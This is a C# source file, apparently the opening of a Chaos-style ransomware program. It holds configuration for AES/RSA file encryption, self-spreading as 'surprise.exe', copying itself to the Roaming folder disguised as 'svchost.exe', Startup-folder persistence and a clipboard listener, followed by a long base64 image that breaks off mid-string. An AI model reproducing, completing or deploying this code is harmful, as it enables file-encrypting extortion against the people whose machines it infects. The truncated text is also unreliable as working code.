using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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